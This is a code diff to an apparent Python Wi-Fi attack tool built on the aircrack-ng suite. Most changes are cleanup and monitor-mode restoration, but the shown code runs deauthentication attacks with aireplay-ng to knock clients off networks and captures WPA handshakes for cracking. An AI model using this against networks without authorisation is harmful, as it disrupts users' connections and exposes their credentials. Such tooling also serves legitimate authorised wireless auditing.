@@ -22,7 +22,8 @@ def select_interface():
     out = run_cmd(['iw', 'dev'])
     matches = re.findall(r'Interface\s+(\w+)', out)
     if not matches:
-        print(Fore.RED + "[!] No wireless interfaces detected."); exit(1)
+        print(Fore.RED + "[!] No wireless interfaces detected.")
+        exit(1)
     print("Available interfaces:")
     for i, name in enumerate(matches, 1):
         print(f"  [{i}] {name}")
@@ -31,6 +32,8 @@ def select_interface():
 
 def enable_monitor():
     global MON_IF
+    print(Fore.YELLOW + "[*] Killing interfering processes (NetworkManager, wpa_supplicant, etc)...")
+    subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], check=False)
     iface = select_interface()
     try:
         run_cmd(['airmon-ng', 'start', iface], sudo=True)
@@ -43,11 +46,27 @@ def enable_monitor():
 def disable_monitor():
     if MON_IF:
         run_cmd(['airmon-ng', 'stop', MON_IF], sudo=True)
+        iface = MON_IF[:-3] if MON_IF.endswith('mon') else MON_IF
+        subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'down'])
+        subprocess.run(['sudo', 'iw', iface, 'set', 'type', 'managed'])
+        subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'])
+        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], check=False)
+
+def cleanup():
+    print(Fore.YELLOW + "[*] Cleaning up monitor mode and restarting networking...")
+    disable_monitor()
 
 def start_airodump():
     return subprocess.Popen(['sudo','airodump-ng','--write-interval','1',
                              '--write','/tmp/apdump','--output-format','csv', MON_IF],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def wait_for_csv(timeout=5):
+    for _ in range(timeout * 2):
+        if os.path.exists('/tmp/apdump-01.csv'):
+            return True
+        time.sleep(0.5)
+    return False
 
 def parse_csv():
     try:
@@ -112,7 +131,8 @@ def deauth_and_capture(bssid, ssid, target_mac, channel):
     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(3)
     subprocess.Popen(['aireplay-ng','--deauth','5','-a',bssid, *(['-c',target_mac] if target_mac else []), MON_IF])
-    time.sleep(10); run.terminate()
+    time.sleep(10)
+    run.terminate()
     print(Fore.CYAN + f"[*] verifying {cap} ...", end=' ')
     res = subprocess.run(['aircrack-ng','-a2','-w','/dev/null',cap], stdout=subprocess.PIPE, text=True)
     ok = 'handshake' in res.stdout.lower()
@@ -138,7 +158,6 @@ def display(aps):
             signal = Fore.YELLOW + f"{sig_val}".rjust(5) + Style.RESET_ALL
         else:
             signal = Fore.RED + f"{sig_val}".rjust(5) + Style.RESET_ALL
-
         ch = str(info['ch']).rjust(3)
         num_clients = str(len(info['clients'])).rjust(4)
         hs_flag = Fore.GREEN + '[OK]' if info.get('handshake') else Fore.RED + '[--]'
@@ -198,12 +217,12 @@ def main():
     time.sleep(2)
     if proc.poll() is not None:
         print(Fore.RED + "[!] airodump-ng exited prematurely.")
-        disable_monitor()
+        cleanup()
         return
 
     if not wait_for_csv():
         print(Fore.RED + "[!] Timeout waiting for airodump-ng to write CSV output.")
-        disable_monitor()
+        cleanup()
         return
 
     state = {'running': True, 'do_h': False, 'do_H': False}
@@ -233,9 +252,9 @@ def main():
     except KeyboardInterrupt:
         pass
     finally:
-        proc.terminate()
-        disable_monitor()
-
+        cleanup()
+        if proc:
+            proc.terminate()
 
 if __name__ == "__main__":
     main()
